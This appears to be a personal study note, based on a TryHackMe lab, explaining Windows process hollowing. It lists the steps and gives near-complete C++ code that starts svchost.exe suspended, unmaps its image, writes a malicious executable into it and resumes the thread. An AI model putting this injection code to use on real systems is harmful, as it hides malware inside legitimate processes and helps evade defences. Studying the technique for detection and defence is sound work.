# Process Hollowing

Lauching of non-malicious process in a suspended state, then *hollowing* the image of process and replaced with malicious executable image.  From [n0n0ph1](https://github.com/m0n0ph1/Process-Hollowing) *"..a bootstrap application creates a seemingly innocent process in a suspended state. The legitimate image is then unmapped and replaced with the image that is to be hidden. If the preferred image base of the new image does not match that of the old image, the new image must be rebased. Once the new image is loaded in memory the EAX register of the suspended thread is set to the entry point. The process is then resumed and the entry point of the new image is executed."*

Similiar to [[Windows-Shellcode-Injection]] this technique inject an entire malicious file into a process by “hollowing” or un-mapping the process and injecting specific PE (**P**ortable **E**xecutable) data and sections into the targeted process.

#### Process Hollowing Steps

Windows API calls interact with process memory steps that diverge to  `Malicious Memory Region` within the `Hollowed Memory Region`:
1.  Create a target process in a suspended state.
2.  Open a malicious image.
3.  Un-map legitimate code from process memory.
4.  Allocate memory locations for malicious code and write each section into the address space.
5.  Set an entry point for the malicious code.
6.  Take the target process out of a suspended state.

1. Create Process - Create a target process in a suspended state.
2. Suspend Process
	1. Malicious Process - Open a malicious image.
		1. Malicious File
		2. VirtualAlloc
		3. ReadFile
	2. Un-map legitimate code from process memory.
		1. Process Memory
		2. Thread Stack
			1. GetThreadContext
			2. EBX Register
			3. ZwUnmapViewOfSection -> Process Memory Region
		3. Process Heap
		4. Registers
		5. DLLs
	3. Malicious Process 
			1. VirtualAlloc -Allocate memory locations for malicious code 
			2. WriteProcessMemory -  write each section into the address space of Hollowed Memory Region
3. ResumeThread - Take the target process out of a suspended state.
	1. Set ThreadContext
	2. EAX Register - Changed to Malicious Memory Region


```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
        (LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
        NULL,
        NULL,
        NULL,
        TRUE, // Handles are inherited from the calling process
        CREATE_SUSPENDED, // New process is suspended
        NULL,
        NULL,
        target_si, // pointer to startup info
        target_pi) == 0) { // pointer to process information
        cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
        return 1;

HANDLE hMaliciousCode = CreateFileA(
        (LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
        GENERIC_READ, // Read-only access
        FILE_SHARE_READ, // Read-only share mode
        NULL,
        OPEN_EXISTING, // Instructed to open a file or device if it exists
        NULL,
        NULL
);


DWORD maliciousFileSize = GetFileSize(
        hMaliciousCode, // Handle of malicious image
        0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
        NULL,
        maliciousFileSize, // File size of malicious image
        0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
        0x04 // Enables read/write access (PAGE_READWRITE)
);


DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
        hMaliciousCode, // Handle of malicious image
        pMaliciousImage, // Allocated region of memory
        maliciousFileSize, // File size of malicious image
        &numberOfBytesRead, // Number of bytes read
        NULL
        )) {
        cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
        TerminateProcess(target_pi->hProcess, 0);
        return 1;
}

CloseHandle(hMaliciousCode);

c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
        target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
        &c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
        target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
        (PVOID)(c.Ebx + 8), // Pointer to the base address
        &pTargetImageBaseAddress, // Store target base address 
        sizeof(PVOID), // Bytes to read 
        0 // Number of bytes out
);

HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
        hNtdllBase, // Handle of ntdll
        "ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
        target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        pTargetImageBaseAddress // Base address of the process
);

PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
        target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        pTargetImageBaseAddress, // Base address of the process
        sizeOfMaliciousImage, // Byte size obtained from optional header
        0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
        0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);

if (!WriteProcessMemory(
        target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        pTargetImageBaseAddress, // Base address of the process
        pMaliciousImage, // Local memory where the malicious file resides
        pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
        NULL
)) {
        cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}



for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

        WriteProcessMemory(
                target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
                (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
                (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
                pSectionHeader->SizeOfRawData, // Byte size of current section
                NULL
        );
}

c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
        target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
        &c // Pointer to the stored context structure
);

ResumeThread(
        target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);

```


## References

[THM Abusing Window Internals](https://tryhackme.com/room/abusingwindowsinternals)
[n0n0ph1 explaination of Process Hollowing](https://github.com/m0n0ph1/Process-Hollowing) 
[iredtem](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)